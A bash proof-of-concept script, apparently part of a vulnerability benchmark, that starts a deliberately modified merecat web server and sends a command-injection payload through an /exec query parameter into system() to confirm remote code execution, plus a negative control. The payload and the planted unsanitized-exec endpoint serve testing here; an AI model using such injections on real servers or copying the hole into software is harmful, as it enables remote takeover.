#!/usr/bin/env bash
# PoC for 058_merecat_C2I1S1
# Axes: C2 (struct with enabled+logging) / I1 (direct to sink) / S1 (no sanitization)
#
# Vulnerability: both --exec-mode and --exec-logging must be supplied.
# A user-supplied URL query parameter flows directly into system() with no sanitization.
#
# Gate flags required: --exec-mode --exec-logging
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/merecat"
WWWROOT="/tmp/poc_058_www"
MARKER="/tmp/poc_058_marker"
PORT=18058

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting merecat with --exec-mode --exec-logging on port $PORT..."
"$BINARY" -n -p "$PORT" "$WWWROOT" --exec-mode --exec-logging &
SERVER_PID=$!
sleep 2

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent with only one gate flag ─────────────────
echo "[*] verifying gate: endpoint must be absent with only --exec-mode (no --exec-logging)..."
NEG_PORT=$((19000 + 58))
"$BINARY" -n -p $NEG_PORT "$WWWROOT" --exec-mode &
SAFE_PID=$!
sleep 2
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-logging"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
